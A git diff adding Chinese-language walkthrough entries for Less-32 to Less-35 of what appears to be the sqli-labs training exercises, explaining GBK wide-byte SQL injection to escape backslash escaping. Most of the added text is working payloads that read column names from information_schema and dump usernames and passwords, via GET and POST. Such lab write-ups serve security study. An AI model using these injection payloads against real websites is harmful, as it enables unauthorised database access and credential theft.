@@ -1048,3 +1048,34 @@ $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and passwor
 
 将闭合方式更换为`")`
 
+### Less-32
+
+题目中对`' " \`进行了转义处理,转义为`\' \" \\`,使用宽字节注入进行绕过
+
+mysql在使用GBK编码时,会认为两个字符为一个汉字,例如`%c4%e3`就是一个汉字(前一个ASCII码要大于128)
+
+假设传入`?id=%df'`,此时`'`被转义为`\'`,因此最终要执行sql查询的的参数为`%df\'`而mysql将`%df\`理解为一个汉字,从而让`'`逃逸出来
+
+传入`?id=%df'`返回`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''�\'' LIMIT 0,1' at line 1`说明成功将`'`逃逸
+
+传入`?id=-1%df' or 1=1%23`正常回显
+
+传入`?id=-1%df' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273)%23`返回列名,此时由于`'users'`需要用单引号但不能使用宽字节闭合,因此使用16进制代替
+
+传入`?id=-1%df' union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23`得到用户名和密码
+
+### Less-33
+
+同上
+
+### Less-34
+
+同样是宽字节注入,使用POST传参
+
+传入`uname=a%df' union select (select group_concat(username) from users),(select group_concat(password) from users)%23&passwd=a&submit=Submit`返回用户名和密码
+
+### Less-35
+
+不需要构造闭合
+
+传入`?id=-1 union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23`返回用户名和密码
